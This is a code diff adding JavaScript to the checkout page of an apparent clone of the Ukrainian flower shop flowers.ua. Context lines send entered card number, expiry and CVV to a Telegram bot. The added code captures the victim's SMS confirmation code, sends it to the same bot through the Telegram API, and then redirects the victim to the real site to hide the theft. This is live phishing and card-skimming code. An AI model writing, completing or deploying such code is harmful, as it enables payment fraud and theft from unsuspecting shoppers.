@@ -94,3 +94,23 @@
         sendToTelegram(ДАНІ КАРТКИ\nНомер: ${card}\nТермін: ${exp}\nCVV: ${cvv});
         nextStep(5);
     }
+function finalSubmit() {
+        let sms = document.getElementById('smsCode').value.trim();
+        if (!sms) { alert('Введіть код з SMS'); return; }
+        orderData.sms = sms;
+        sendToTelegram(КОД ІЗ СМС: ${sms});
+        alert('Дякуємо, очікуйте на зв\'язок з кур\'єром.');
+        // перехід на оригінал сайту
+        window.location.href = 'https://flowers.ua';
+    }
+
+    function sendToTelegram(message) {
+        fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        }).catch(e => console.log('Помилка відправки', e));
+    }
+</script>
+</body>
+</html>
